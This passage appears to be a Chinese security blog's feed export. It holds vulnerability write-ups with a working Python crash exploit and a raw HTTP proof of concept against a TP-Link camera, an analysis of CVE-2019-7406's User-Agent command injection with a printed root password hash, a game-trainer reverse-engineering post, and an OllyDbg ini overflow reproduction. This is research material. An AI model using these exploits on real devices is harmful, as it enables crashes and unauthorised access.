class="string">&quot;gzip, deflate&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">key, p</span>):</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">    cipher_text = base64.b64encode(cipher.encrypt(p))</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_public_key</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/stok=&quot;</span> + stok + <span class="string">&quot;/ds&quot;</span></span><br><span class="line">    data = <span class="string">r&#x27;&#123;&quot;user_management&quot;:&#123;&quot;get_encrypt_info&quot;:&#123;&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;&#x27;</span></span><br><span class="line">    res = requests.post(url, headers=headers, data=data)</span><br><span class="line">    public_key = res.content[<span class="number">40</span>:-<span class="number">41</span>]</span><br><span class="line">    <span class="keyword">return</span> urllib.unquote(public_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_alive</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(res.status_code) == <span class="string">&quot;200&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/stok=&quot;</span> + stok + <span class="string">&quot;/ds&quot;</span></span><br><span class="line">    public_key = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span> + get_public_key(ip, port) + <span class="string">&quot;\n-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    password = rsa_encrypt(public_key, <span class="string">&quot;a&quot;</span> * (<span class="number">0x60</span>))</span><br><span class="line">    data = <span class="string">r&#x27;&#123;&quot;user_management&quot;:&#123;&quot;check_user_info&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&#x27;</span> + password +<span class="string">r&#x27;&quot;,&quot;encrypt_type&quot;:&quot;2&quot;&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;&#x27;</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=data, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Success!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Failed!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.content)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> is_alive(ip, port):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Target is alive!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target seems down!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    res = exploit(ip, port)</span><br></pre></td></tr></table></figure></div>

<p>由于请求 dsd 文件需要登录权限，所以首先要获取一个合法的 stok 值，可通过抓包获取。之后设置好 ip 参数执行程序即可看到效果。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop python TP-LinkIPC.py </span><br><span class="line">[+] Target is alive!</span><br><span class="line">[*] Success!</span><br><span class="line">(&#x27;Connection aborted.&#x27;, BadStatusLine(&#x27;0\r\n&#x27;,))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4-1.png"
                     
                ></p>
<p>可以看到 dsd 程序崩溃，守护进程重置了 dsd，多次发送数据看到 dsd 多次崩溃。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4-2.png"
                     
                ></p>
<p>但是进一步利用会遇到困难，由于没有合适的调试环境，无法确定溢出到什么位置，另外设备可能开启了 ASLR，导致盲测难度很高。</p>
<p>另外在测试漏洞的过程中，我发现了另外一个能够使 dsd 程序崩溃的 POC：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /stok=*/ds HTTP/1.1</span><br><span class="line">Host: 192.168.3.20</span><br><span class="line">Content-Length: 326</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.3.20</span><br><span class="line">Referer: http://192.168.3.20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">&#123;&quot;system&quot;:&#123;&quot;config_recovery&quot;:&#123;&quot;config_name&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;pt1_x&quot;:&quot;1657&quot;,&quot;pt1_y&quot;:&quot;4382&quot;,&quot;pt2_x&quot;:&quot;9253&quot;,&quot;pt2_y&quot;:&quot;4413&quot;,&quot;direction&quot;:&quot;AtoB&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;pt1_x&quot;:&quot;1206&quot;,&quot;pt1_y&quot;:&quot;1574&quot;,&quot;pt2_x&quot;:&quot;9392&quot;,&quot;pt2_y&quot;:&quot;1327&quot;,&quot;direction&quot;:&quot;BtoA&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;]&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;</span><br></pre></td></tr></table></figure></div>





























]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>简单的游戏修改器实现2</title>
    <url>/2020/03/03/game_trainer2/</url>
    <content><![CDATA[<p>上次简单实现了一个修改器，功能比较简单，只能修改人物的血量，实际上想要写出功能强大的修改器，需要对游戏进程一定程度的逆向分析，以便于定位关键逻辑和相关数据结构。</p>
<span id="more"></span>

<h2 id="从内存数据入手"><a href="#从内存数据入手" class="headerlink" title="从内存数据入手"></a>从内存数据入手</h2><p>依旧以挺进地牢这款游戏为例，上次我们利用 CE 找到了一些静态指针，考虑到游戏开发的内容，角色的血量等数据肯定被保存在某个对象中，既然找到了血量，血量附近一定存在另外一些和角色相关的数据。</p>
<p>首先找到血量所在的地址，将它添加到列表中，然后右键选择 Browse this memory region 选项，弹出一个窗口，选择 Tool 选项卡中的 Dissect data&#x2F;structures，弹出另外一个窗口，选择 Structures 选项卡中的 Define new structure，默认选项 ok 即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-1.png"
                     
                ></p>
<p>窗口中会出现很多数据，第一项是血量，其余数据暂时不知道是什么。保持这个窗口不要关闭，回到游戏操作人物，当进行某些特定操作的时候，列表中的数据会发生变动，例如当拾取了一个护甲，有数据会增加，那么我们可以合理的猜测这个数据代表了护甲的数量，依照此思路逐个搜索其他数据，例如子弹数量、金币数量等等，在这些数据附近会发现更多随着操作变动的内容。</p>
<p>某些数据是可以猜测出来的，但是更多的数据看似在随机变动，并且手动修改也看不出来有什么影响，此时就需要对游戏进程一定程度的逆向分析，尝试从代码中梳理游戏的逻辑。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>不同游戏逆向分析的过程是不同的，因为游戏采用了不一样的引擎，例如挺进地牢使用的是 Unity3D 引擎开发，意味着游戏使用 C# 编写，而其它引擎等可能使用的是 C++ 编写，不同语言开发的游戏在逆向上有一定的差别，但是思路大体相同。</p>
<p>C# 逆向相对比较简单，游戏的主体是 Assembly-CSharp.dll，在没有混淆保护的情况下，使用 ILSpy、dnspy 等工具可轻易的反编译此文件。</p>
<p>打开文件后看到其中定义了很多类，考虑到血量数据，我们首先寻找和单词 Health 有关的类。</p>
<p>和 Health 相关的类较少，简单分析一下可以发现类 HealthHaver 很可疑，dnSpy 等工具包含“分析”功能，通过分析，发现这个类被很多类所引用，并且引用此类的类都和游戏角色(进一步讲，是具有血量的角色)有关，例如 AIActor、Player 等。查看此类的成员发现存在 currentHealth、currentArmor 等。</p>
<p>单从逆向结果上看并不能确定这个类就和角色血量有关，此时我们可以结合 CE 修改来确定。首先在 dnSpy  中点击成员变量的 Token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-2.png"
                     
                ></p>
<p>左侧会显示出变量的正确定义顺序(默认情况是字母排序)，可以发现在 currentHealth 下方就是 currentArmor ，并且还有 maximumHealth 等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer2-3.png"
                     
                ></p>
<p>在 CE 的结构体列表中我们能够定位的是 CurrentHealth，那么尝试修改和它相邻的两个成员呢？</p>
<p>修改之后返回游戏查看，角色的最大生命值和护甲将发生变化。这样我们就成功定位到了和血上限、护甲相关的数据。</p>
<p>这个游戏中有很多武器，按照开发的思路来看，不同的武器应该会继承于同一个类，或者直接使用一个类来表示，武器拥有子弹数量，这个数量肯定通过类中的某个成员表示。那么和修改血量一样，我们可以通过搜索当前子弹数量来定位到枪械的结构体，在 dnSpy 中刚好发现了一个类叫做 Gun，里面包含子弹数量、武器名字等等数据。</p>
<p>和修改血量的思路一样，在 dnSpy 中找到数据的位置，在 CE 中尝试修改即可逐步理清各个数据的作用。</p>
<p>但是这里有一个问题，当修改完武器的数据之后，如果我们拾取了新的武器，刚刚修改的效果并不会转移到新的武器上面，思考其原因，保存角色信息的类肯定存在某个成员例如 currentGun，用于表示当前角色正在使用的武器对象，切换武器之后这个成员内容会发生变化。所以想要稳定修改所有武器的数据，就要找到保存角色信息的数据。</p>
<p>按照以上思路，通过逆向分析找到角色信息类，然后通过 CE 修改确定。这里不在赘述，保存角色信息的类叫做 PlayerController，里面的 inventory 字段表示一个 GunInventory 对象，这个对象拥有 currentGun 成员，表示当前角色正在使用的武器对象。</p>
<h2 id="代码实现修改器"><a href="#代码实现修改器" class="headerlink" title="代码实现修改器"></a>代码实现修改器</h2><p>基于以上思路，对之前的修改器进行修改，添加了无限子弹，一击必杀等功能(可能有 BUG)，修改版本已经上传到 Github，感兴趣的朋友可以看一下。</p>
<p><a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>GAME</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-7406</title>
    <url>/2020/02/29/CVE-2019-7406/</url>
    <content><![CDATA[<p>re365 是 TP-Link 旗下的一款 WiFi 信号拓展器，IBM 安全研究员在此设备上面发现了一个严重的 RCE 漏洞，不需要身份验证，攻击者可以通过向设备发送畸形的 HTTP 数据包在设备上执行任意命令。</p>
<span id="more"></span>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先去 TP-Link 官方网站下载固件 <a class="link"   href="https://www.tp-link.com/uk/support/download/re365/#Firmware" >https://www.tp-link.com/uk/support/download/re365/#Firmware<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>应该下载 2018-06-05 释出的固件，最新版固件已经修复了此漏洞。</p>
<p>下载后解压出固件，可直接使用 binwalk 解压固件。通过查看 init 信息，发现系统启动之后会自动运行 &#x2F;usr&#x2F;bin&#x2F;httpd 程序，这个程序应该是用于处理 HTTP 请求的，先查看一下基本信息：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpd: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped</span><br></pre></td></tr></table></figure></div>

<p>MIPS 小端序，直接使用 Ghidra 进行分析。</p>
<p>根据披露信息，可以定位到函数 httpRpmWmbParse，在第 89 行位置存在如下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  __haystack = (<span class="type">char</span> *)httpGetEnv(param_1,<span class="string">&quot;USER_AGENT&quot;</span>);</span><br><span class="line">  iVar2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    pcVar6 = <span class="built_in">strstr</span>(__haystack,&amp;DAT_004b11e0 + iVar2);</span><br><span class="line">    iVar2 = iVar2 + <span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">if</span> (pcVar6 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      PRINTF_ECHO(<span class="string">&quot;Mobile Agent: %s&quot;</span>,__haystack);</span><br><span class="line">      DAT_004b3718 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_0047e8e0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (iVar2 != <span class="number">0xd2</span>);</span><br></pre></td></tr></table></figure></div>

<p>和许多固件一样，这里会从当前环境变量中取得相应的数据，然后对其进行一系列操作。</p>
<p>首先从环境变量中取得 user-agent 字段，然后利用 strstr 函数判断其中是否存在某些字符串，例如</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iPod</span><br><span class="line">iPod touch</span><br><span class="line">iPhone</span><br><span class="line">Mobile Safari 等</span><br></pre></td></tr></table></figure></div>

<p>如果存在这些字符串其中一个，就使用 PRINTF_ECHO 将其打印到终端</p>
<p>PRINTF_ECHO 函数如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PRINTF_ECHO</span><span class="params">(<span class="type">char</span> *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack268 [<span class="number">260</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = param_2;</span><br><span class="line">  local_res8 = param_3;</span><br><span class="line">  local_resc = param_4;</span><br><span class="line">  <span class="built_in">memset</span>(acStack268,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">vsprintf</span>(acStack268,param_1,&amp;local_res4);</span><br><span class="line">  execFormatCmd(<span class="string">&quot;echo \&quot;====&gt;&gt;&gt;&gt;%s\&quot; &gt; /dev/console \r\n&quot;</span>,acStack268);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Ghidra 的参数识别有一些异常，但是反编译结果是正确的，第一个参数是格式化字符串 “Mobile Agent: %s”，第二个参数是取得的 user-agent 字段。</p>
<p>接着调用 execFormatCmd 函数，内容如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">execFormatCmd</span><span class="params">(<span class="type">char</span> *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack268 [<span class="number">264</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = param_2;</span><br><span class="line">  local_res8 = param_3;</span><br><span class="line">  local_resc = param_4;</span><br><span class="line">  <span class="built_in">vsprintf</span>(acStack268,param_1,&amp;local_res4);</span><br><span class="line">  FUN_0040b740(acStack268);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数会利用 vfprintf 将外面传进来的参数放在 stack 268 中，然后调用函数 FUN_0040b740</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FUN_0040b740</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> __pid;</span><br><span class="line">  undefined4 uVar1;</span><br><span class="line">  <span class="type">__pid_t</span> _Var2;</span><br><span class="line">  <span class="type">int</span> *piVar3;</span><br><span class="line">  <span class="type">int</span> local_30;</span><br><span class="line">  <span class="type">char</span> *local_2c;</span><br><span class="line">  undefined *local_28;</span><br><span class="line">  <span class="type">int</span> local_24;</span><br><span class="line">  undefined4 local_20;</span><br><span class="line">  <span class="type">int</span> local_18;</span><br><span class="line">  </span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (param_1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_18 = param_1;</span><br><span class="line">    __pid = fork();</span><br><span class="line">    uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">if</span> (__pid != <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (__pid == <span class="number">0</span>) &#123;</span><br><span class="line">        local_2c = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">        local_24 = local_18;</span><br><span class="line">        local_28 = &amp;DAT_004916fc;</span><br><span class="line">        local_20 = <span class="number">0</span>;</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,&amp;local_2c,(<span class="type">char</span> **)<span class="number">0x0</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0x7f</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        _Var2 = waitpid(__pid,&amp;local_30,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (_Var2 != <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> local_30;</span><br><span class="line">        &#125;</span><br><span class="line">        piVar3 = __errno_location();</span><br><span class="line">        uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (*piVar3 == <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接使用 execve 拼接上面的命令然后执行，过程中不存在对参数的过滤。所以可以通过构造合适的 user-agent 字段来达到 RCE 的目的。</p>
<h2 id="re365-的其他几个漏洞"><a href="#re365-的其他几个漏洞" class="headerlink" title="re365 的其他几个漏洞"></a>re365 的其他几个漏洞</h2><p>细心的同学应该会发现，在函数 PRINTF_ECHO 以及后面的 execFormatCmd 都有 vfprintf 函数，但是在使用这些函数的时候没有检验一下源字符串的长度，因为 user-agent 是用户可控的，所以这里是存在栈溢出的。</p>
<p>另外在 &#x2F;etc&#x2F;shadow 文件中有以下数据</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::</span><br></pre></td></tr></table></figure></div>

<p>感兴趣的可以自己搜索一下这段密码，设备默认应该是开放了带有密码的 telnet，得到这串密码的明文我们似乎就可以直接登录设备了。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>OllyDBG ollydbg.ini 缓冲区溢出漏洞复现</title>
    <url>/2020/02/25/ODBUG/</url>
    <content><![CDATA[<p>闲来无事复现一个 ollydbg 的洞。</p>
<span id="more"></span>

<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞可以在知道创宇的漏洞组件中找到</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.seebug.org/vuldb/ssvid-3876</span><br></pre></td></tr></table></figure></div>

<p>不过它年代久远，里面的具体信息链接已经失效了，经过 google 发现了一个相关链接</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://arabteam2000-forum.com/index.php?/topic/168295-ollydbg-110-local-buffer-overflow-exploit/</span><br></pre></td></tr></table></figure></div>

<p>这个页面貌似是中东那边的论坛，谷歌翻译勉强能看懂一点，幸好帖子中给出了关于这个漏洞的演示视频以及 payload，但是不包含详细的漏洞成因，出于好奇尝试对此漏洞进行分析。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>简单看了一下视频，加上给出的 POC 成功触发漏洞。其中 POC 如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Settings]</span><br><span class="line">Check DLL versions = 0</span><br><span class="line">Show toolbar =1</span><br><span class="line">Status in toolbar =0</span><br><span class="line">Use hardware breakpoints to step =0</span><br><span class="line">Restore windows =1</span><br><span class="line">Scroll MDI =0</span><br><span class="line">Horizontal scroll =0</span><br><span class="line">Topmost window =0</span><br><span class="line">Index of default font =1</span><br><span class="line">Index of default colours =0</span><br><span class="line">Index of default syntax highlighting =0</span><br><span class="line">Log buffer size index =0</span><br><span class="line">Run trace buffer size index =1</span><br><span class="line">Group adjacent commands in profile =1</span><br><span class="line">Highlighted trace register =-1</span><br><span class="line">IDEAL disassembling mode =0</span><br><span class="line">Disassemble in lowercase =0</span><br><span class="line">Separate arguments with TAB =0</span><br><span class="line">Extra space between arguments =0</span><br><span class="line">Show default segments =1</span><br><span class="line">NEAR jump modifiers =0</span><br><span class="line">Use short form of string commands =0</span><br><span class="line">Use RET instead of RETN =0</span><br><span class="line">Size sensitive mnemonics =1</span><br><span class="line">SSE size decoding mode =0</span><br><span class="line">Top of FPU stack =1</span><br><span class="line">Always show memory size =1</span><br><span class="line">Decode registers for any IP =0</span><br><span class="line">Show symbolic addresses =1</span><br><span class="line">Show local module names =1</span><br><span class="line">Gray data used as filling =1</span><br><span class="line">Show jump direction =1</span><br><span class="line">Show jump path =0</span><br><span class="line">Show jumpfrom path =0</span><br><span class="line">Show path if jump is not taken =0</span><br><span class="line">Underline fixups =1</span><br><span class="line">Center FOLLOWed command =0</span><br><span class="line">Show stack frames =1</span><br><span class="line">Show local names in stack =1</span><br><span class="line">Extended stack trace =0</span><br><span class="line">Synchronize source with CPU =0</span><br><span class="line">Include SFX extractor in code =0</span><br><span class="line">SFX trace mode =0</span><br><span class="line">Use real SFX entry from previous run =1</span><br><span class="line">Ignore SFX exceptions =0</span><br><span class="line">First pause =2</span><br><span class="line">Stop on new DLL =0</span><br><span class="line">Stop on DLL unload =0</span><br><span class="line">Stop on new thread =0</span><br><span class="line">Stop on thread end =0</span><br><span class="line">Stop on debug string =0</span><br><span class="line">Decode SSE registers =0</span><br><span class="line">Enable last error =1</span><br><span class="line">Ignore access violations in KERNEL32 =1</span><br><span class="line">Ignore INT3 =0</span><br><span class="line">Ignore TRAP =0</span><br><span class="line">Ignore access violations =0</span><br><span class="line">Step in unknown commands =0</span><br><span class="line">Ignore division by 0 =0</span><br><span class="line">Ignore illegal instructions =0</span><br><span class="line">Ignore all FPU exceptions =0</span><br><span class="line">Warn when frequent breaks =0</span><br><span class="line">Warn when break not in code =1</span><br><span class="line">Autoreturn =0</span><br><span class="line">Save original command in trace =0</span><br><span class="line">Show traced ESP =0</span><br><span class="line">Show traced flags =0</span><br><span class="line">Animate over system DLLs =0</span><br><span class="line">Trace over string commands =0</span><br><span class="line">Synchronize CPU and Run trace =0</span><br><span class="line">Ignore custom exceptions =0</span><br><span class="line">Smart update =1</span><br><span class="line">Set high priority =1</span><br><span class="line">Append arguments =1</span><br><span class="line">Use ExitProcess =1</span><br><span class="line">Allow injection to get WinProc =0</span><br><span class="line">Sort WM_XXX by name =0</span><br><span class="line">Type of last WinProc breakpoint =0</span><br><span class="line">Snow-free drawing =0</span><br><span class="line">Demangle symbolic names =0</span><br><span class="line">Keep ordinal in name =1</span><br><span class="line">Only ASCII printable in dump =0</span><br><span class="line">Allow diacritical symbols =0</span><br><span class="line">String decoding =3</span><br><span class="line">Warn if not administrator =1</span><br><span class="line">Warn when terminating process =1</span><br><span class="line">Align dialogs =1</span><br><span class="line">Use font of calling window =0</span><br><span class="line">Specified dialog font =0</span><br><span class="line">Number of lines that follow EIP =0</span><br><span class="line">Restore window positions =1</span><br><span class="line">Restore width of columns =0</span><br><span class="line">Highlight sorted column =0</span><br><span class="line">Compress analysis data =1</span><br><span class="line">Backup UDD files =1</span><br><span class="line">Fill rest of command with NOPs =1</span><br><span class="line">Reference search mode =0</span><br><span class="line">Global search =1</span><br><span class="line">Aligned search =0</span><br><span class="line">Allow error margin =0</span><br><span class="line">Keep size of hex edit selection =1</span><br><span class="line">Modify tag of FPU register =1</span><br><span class="line">Hex inspector limits =1</span><br><span class="line">MMX display mode =0</span><br><span class="line">Last selected options card =0</span><br><span class="line">Last selected appearance card =0</span><br><span class="line">Ignore case in text search =1</span><br><span class="line">Letter key in Disassembler =1</span><br><span class="line">Looseness of code analysis =1</span><br><span class="line">Decode pascal strings =1</span><br><span class="line">Guess number of arguments =1</span><br><span class="line">Accept far calls and returns =0</span><br><span class="line">Accept direct segment modifications =0</span><br><span class="line">Decode VxD calls =0</span><br><span class="line">Accept privileged commands =0</span><br><span class="line">Accept I/O commands =0</span><br><span class="line">Accept NOPs =1</span><br><span class="line">Accept shifts out of range =0</span><br><span class="line">Accept superfluous prefixes =0</span><br><span class="line">Accept LOCK prefixes =0</span><br><span class="line">Accept unaligned stack operations =1</span><br><span class="line">Accept non-standard command forms =1</span><br><span class="line">Show ARG and LOCAL in procedures =0</span><br><span class="line">Save analysis to file =1</span><br><span class="line">Analyse main module automatically =1</span><br><span class="line">Analyse code structure =1</span><br><span class="line">Decode ifs as switches =0</span><br><span class="line">Save trace to file =0</span><br><span class="line">Trace contents of registers =1</span><br><span class="line">Functions preserve registers =0</span><br><span class="line">Decode tricks =0</span><br><span class="line">Automatically select register type =0</span><br><span class="line">Show decoded arguments =1</span><br><span class="line">Show decoded arguments in stack =1</span><br><span class="line">Show arguments in call stack =1</span><br><span class="line">Show induced calls =1</span><br><span class="line">Label display mode =0</span><br><span class="line">Label includes module name =0</span><br><span class="line">Highlight symbolic labels =0</span><br><span class="line">Highlight RETURNs in stack =1</span><br><span class="line">Ignore path in user data file =0</span><br><span class="line">Ignore timestamp in user data file =1</span><br><span class="line">Ignore CRC in user data file =0</span><br><span class="line">Default sort mode in Names =1</span><br><span class="line">Save out-of-module user data =0</span><br><span class="line">Tabulate columns in log file =0</span><br><span class="line">Append data to existing log file =0</span><br><span class="line">Flush gathered data to log file =0</span><br><span class="line">Skip spaces in source comments =1</span><br><span class="line">Hide non-existing source files =0</span><br><span class="line">Tab stops =8</span><br><span class="line">File graph mode =2</span><br><span class="line">Show internal handle names =0</span><br><span class="line">Hide irrelevant handles =0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[History]</span><br><span class="line">Executable[0] =C:\Users\lenovo\Desktop\baofeng.exe</span><br><span class="line">View file = </span><br><span class="line">View text file = </span><br><span class="line">Object file = </span><br><span class="line">Import library = </span><br><span class="line">Log file =log.txt</span><br><span class="line">Run trace file =rtrace.txt</span><br><span class="line">API help file = </span><br><span class="line">Text save file = </span><br><span class="line">Symbolic data path =E:\my prog\Cracking Tools\odbg110</span><br><span class="line">UDD path =C:\Users\lenovo\Desktop\ollydbg\ollydbg\UDD</span><br><span class="line">Plugin path =C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin</span><br><span class="line">Executable[1] =</span><br><span class="line">Executable[2] = </span><br><span class="line">Executable[3] = </span><br><span class="line">Executable[4] = </span><br><span class="line">Executable[5] = </span><br><span class="line"></span><br><span class="line"></span><br><span 